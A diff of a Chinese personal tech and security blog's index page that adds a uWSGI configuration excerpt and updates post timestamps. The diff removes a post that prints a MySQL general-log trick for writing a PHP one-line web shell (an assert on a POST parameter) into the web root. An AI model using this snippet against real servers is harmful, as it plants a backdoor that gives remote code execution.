@@ -15,7 +15,7 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-CN">
-<head><meta name="generator" content="Hexo 3.8.0">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -349,6 +349,200 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://sin1ght.github.io/2018/08/12/flasknginxuwsgi-e9-85-8d-e7-bd-ae/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sinight">
+      <meta itemprop="description" content="潜心学习,不忘初心">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sinight Awesome">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/08/12/flasknginxuwsgi-e9-85-8d-e7-bd-ae/" class="post-title-link" itemprop="url"> flask+nginx+uwsgi配置		</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-08-12 12:07:52" itemprop="dateCreated datePublished" datetime="2018-08-12T12:07:52+08:00">2018-08-12</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-08-24 22:47:22" itemprop="dateModified" datetime="2020-08-24T22:47:22+08:00">2020-08-24</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/WEB前端-后端/" itemprop="url" rel="index"><span itemprop="name">WEB前端/后端</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h3 id="uwsgi配置（-ini）"><a href="#uwsgi配置（-ini）" class="headerlink" title="uwsgi配置（.ini）"></a>uwsgi配置（.ini）</h3><pre><code>[uwsgi]
+socket = 127.0.0.1:5001 #监听的端口，或者用socket文件，/tmp/uwsgi.sock
+chdir = /python-test/tea/ #项目主目录,放在程序主目录下，可不写
+wsgi-file = manage.py  #项目启动文件
+callable = app  #主应用名
+processes = 4   #开启进程数
+buffer-size = 65535
+master = true #允许uwsgi主进程
+plugins = python #解决python与uwsgi兼容问题
+#sudo apt-get install uwsgi-plugin-python
+uid=1000 #设置运行用户uid/用户名
+gid=1000 #用户组id
+disable-logging=true #不记录请求信息的日志。只记录错误以及uWSGI内部消息到日志中
+logto =uwsgi_web.log
+virtualenv＝/home/proj/virtualenv #python虚拟环境
+</code></pre>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/08/12/flasknginxuwsgi-e9-85-8d-e7-bd-ae/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://sin1ght.github.io/2018/08/05/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8b-e8-bf-9b-e5-85-a5-e5-86-85-e7-bd-91/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -411,7 +605,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-25 18:05:58" itemprop="dateModified" datetime="2019-02-25T18:05:58+08:00">2019-02-25</time>
+                <time title="修改时间：2020-08-24 22:47:22" itemprop="dateModified" datetime="2020-08-24T22:47:22+08:00">2020-08-24</time>
               
             
           </span>
@@ -606,7 +800,7 @@ proxychains4 nmap -sT ip
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-25 18:06:57" itemprop="dateModified" datetime="2019-02-25T18:06:57+08:00">2019-02-25</time>
+                <time title="修改时间：2020-08-24 22:47:23" itemprop="dateModified" datetime="2020-08-24T22:47:23+08:00">2020-08-24</time>
               
             
           </span>
@@ -795,7 +989,7 @@ UnRestricted    //所有的脚本都将运行
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-25 18:07:41" itemprop="dateModified" datetime="2019-02-25T18:07:41+08:00">2019-02-25</time>
+                <time title="修改时间：2020-08-24 22:47:23" itemprop="dateModified" datetime="2020-08-24T22:47:23+08:00">2020-08-24</time>
               
             
           </span>
@@ -974,7 +1168,7 @@ UnRestricted    //所有的脚本都将运行
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-25 17:15:51" itemprop="dateModified" datetime="2019-02-25T17:15:51+08:00">2019-02-25</time>
+                <time title="修改时间：2020-08-24 22:47:22" itemprop="dateModified" datetime="2020-08-24T22:47:22+08:00">2020-08-24</time>
               
             
           </span>
@@ -1148,7 +1342,7 @@ UnRestricted    //所有的脚本都将运行
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-25 18:06:47" itemprop="dateModified" datetime="2019-02-25T18:06:47+08:00">2019-02-25</time>
+                <time title="修改时间：2020-08-24 22:47:22" itemprop="dateModified" datetime="2020-08-24T22:47:22+08:00">2020-08-24</time>
               
             
           </span>
@@ -1329,7 +1523,7 @@ UnRestricted    //所有的脚本都将运行
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-25 18:06:39" itemprop="dateModified" datetime="2019-02-25T18:06:39+08:00">2019-02-25</time>
+                <time title="修改时间：2020-08-24 22:47:22" itemprop="dateModified" datetime="2020-08-24T22:47:22+08:00">2020-08-24</time>
               
             
           </span>
@@ -1450,182 +1644,6 @@ RECONFIGURE;
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sin1ght.github.io/2018/07/29/mysql-e6-97-a5-e5-bf-97-e6-8b-bfshell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sinight">
-      <meta itemprop="description" content="潜心学习,不忘初心">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sinight Awesome">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/07/29/mysql-e6-97-a5-e5-bf-97-e6-8b-bfshell/" class="post-title-link" itemprop="url"> Mysql日志拿shell		</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-07-29 08:26:49" itemprop="dateCreated datePublished" datetime="2018-07-29T08:26:49+08:00">2018-07-29</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-02-24 23:58:13" itemprop="dateModified" datetime="2019-02-24T23:58:13+08:00">2019-02-24</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/WEB安全/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <pre><code>set global general_log = on;
-set global general_log_file = &apos;C:/phpStudy/WWW/sinight.php&apos;;
-select &apos;&lt;?php @assert($_POST[&quot;sinight&quot;]); ?&gt;&apos;;
-set global general_log = off;
-</code></pre>
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://sin1ght.github.io/2018/07/27/linux-postgresql-e4-bd-bf-e7-94-a8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1688,7 +1706,7 @@ set global general_log = off;
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-25 18:06:35" itemprop="dateModified" datetime="2019-02-25T18:06:35+08:00">2019-02-25</time>
+                <time title="修改时间：2020-08-24 22:47:22" itemprop="dateModified" datetime="2020-08-24T22:47:22+08:00">2020-08-24</time>
               
             
           </span>
@@ -1874,7 +1892,7 @@ set global general_log = off;
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-25 18:07:33" itemprop="dateModified" datetime="2019-02-25T18:07:33+08:00">2019-02-25</time>
+                <time title="修改时间：2020-08-24 22:47:23" itemprop="dateModified" datetime="2020-08-24T22:47:23+08:00">2020-08-24</time>
               
             
           </span>
@@ -2061,7 +2079,9 @@ set global general_log = off;
                     
                       
                     
-                    <span class="site-state-item-count">1</span>
+                      
+                    
+                    <span class="site-state-item-count">2</span>
                     <span class="site-state-item-name">标签</span>
                   
                 </div>
